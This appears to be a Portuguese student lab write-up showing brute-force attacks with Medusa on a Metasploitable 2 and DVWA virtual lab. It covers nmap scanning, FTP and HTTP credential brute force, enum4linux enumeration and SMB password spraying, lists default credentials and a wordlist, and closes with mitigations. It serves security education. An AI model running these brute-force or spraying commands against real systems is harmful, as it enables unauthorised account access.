# Exercicio
Exercicio

Desafio DIO - Pentest com Kali Linux e Medusa
Sobre o Projeto

Este projeto tem como objetivo demonstrar a utilização da ferramenta Medusa em um ambiente controlado para simular ataques de força bruta contra diferentes serviços, compreendendo seus impactos e identificando medidas de mitigação.

Os testes foram realizados em laboratório utilizando máquinas virtuais no VirtualBox, sem qualquer interação com sistemas reais ou sem autorização.

Objetivos
Compreender o funcionamento de ataques de força bruta.
Utilizar o Kali Linux como plataforma de testes.
Utilizar o Medusa para auditoria de credenciais.
Explorar serviços vulneráveis em ambiente controlado.
Documentar processos técnicos.
Identificar medidas de prevenção.
Ambiente Utilizado
Máquina Atacante
Kali Linux
Item	ValorSistema Operacional	Kali Linux
IP	192.168.56.10
Máquina Alvo
Metasploitable 2
Item	ValorSistema Operacional	Metasploitable 2
IP	192.168.56.20
Topologia
Plain Text
+----------------+
| Kali Linux |
| 192.168.56.10 |
+--------+-------+
|
|
Host-Only Network
|
|
+--------+-------+
| Metasploitable |
| 192.168.56.20 |
+----------------+
Ferramentas Utilizadas
Kali Linux
Medusa
Nmap
DVWA
Metasploitable 2
VirtualBox
Etapa 1 - Descoberta de Serviços

Inicialmente foi realizado o mapeamento das portas abertas.

Shell
nmap -sV 192.168.56.20

Resultado esperado:

Plain Text
21/tcp open ftp
22/tcp open ssh
80/tcp open http
139/tcp open netbios-ssn
445/tcp open microsoft-ds
Cenário 1 - Força Bruta em FTP
Criação da Wordlist

Arquivo:

Plain Text
wordlist.txt

Conteúdo:

Plain Text
123456
admin
password
msfadmin
toor
root
Ataque Utilizando Medusa

Comando:

Shell
medusa -h 192.168.56.20 -u msfadmin -P wordlist.txt -M ftp

Resultado:

Plain Text
ACCOUNT FOUND:
Host: 192.168.56.20
User: msfadmin
Password: msfadmin
Validação

Conexão FTP:

Shell
ftp 192.168.56.20

Login:

Plain Text
User: msfadmin
Password: msfadmin

Acesso obtido com sucesso.

Cenário 2 - Ataque ao DVWA
Configuração

Acessar:

Plain Text
http://192.168.56.20/dvwa

Entrar:

Plain Text
admin
password

Configurar nível:

Plain Text
Security Level = Low
Automatizando Tentativas

Exemplo de comando:

Shell
medusa -h 192.168.56.20 -u admin -P wordlist.txt -M http

Objetivo:

Testar múltiplas credenciais.
Identificar senhas fracas.
Demonstrar vulnerabilidade de autenticação.
Resultado

Foi possível identificar contas utilizando credenciais previsíveis.

Exemplos:

Plain Text
admin:password
admin:admin
Cenário 3 - Password Spraying SMB
Enumeração de Usuários

Utilizando enum4linux:

Shell
enum4linux 192.168.56.20

Resultado:

Plain Text
root
msfadmin
user
service
Password Spraying

Utilizando uma senha comum para vários usuários:

Arquivo:

Plain Text
usuarios.txt
Plain Text
root
msfadmin
user
service

Comando:

Shell
medusa -h 192.168.56.20 -U usuarios.txt -p password -M smbnt
Resultado

Exemplo:

Plain Text
ACCOUNT FOUND
User: user
Password: password
Vulnerabilidades Identificadas
Senhas Fracas

Exemplos:

Plain Text
password
123456
admin

Impacto:

Acesso não autorizado.
Escalada de privilégios.
Vazamento de dados.
Ausência de Bloqueio de Conta

Foi possível realizar diversas tentativas consecutivas sem bloqueio.

Impacto:

Facilita ataques automatizados.
Contas Padrão

Credenciais padrão presentes:

Plain Text
admin:password
msfadmin:msfadmin

Impacto:

Comprometimento imediato.
Mitigações Recomendadas
Política de Senhas Fortes

Exemplo:

✅ Mínimo 12 caracteres

✅ Letras maiúsculas

✅ Letras minúsculas

✅ Números

✅ Caracteres especiais

MFA

Implementar autenticação multifator:

Plain Text
Senha + Aplicativo Autenticador
Bloqueio de Conta

Exemplo:

Plain Text
5 tentativas incorretas
↓
Conta bloqueada por 15 minutos
Monitoramento

Registrar:

Tentativas de login.
Endereços IP.
Horários.
Serviços acessados.
Remover Credenciais Padrão

Trocar imediatamente:

Plain Text
admin/admin
root/root
password/password
Lições Aprendidas

Durante a execução deste laboratório foi possível observar como senhas fracas representam um dos maiores riscos para a segurança da informação.

A utilização do Medusa simplifica a execução de auditorias de autenticação e demonstra como atacantes podem automatizar milhares de tentativas em poucos minutos.

Também foi possível entender a importância de:

MFA;
Senhas robustas;
Monitoramento contínuo;
Políticas de bloqueio de conta;
Revisão periódica de credenciais.
Conclusão

Este projeto permitiu compreender na prática o funcionamento de ataques de força bruta utilizando o Kali Linux e o Medusa em um ambiente seguro. A atividade demonstrou que a combinação de senhas fracas, credenciais padrão e ausência de controles de proteção pode resultar em comprometimento total de sistemas e serviços.
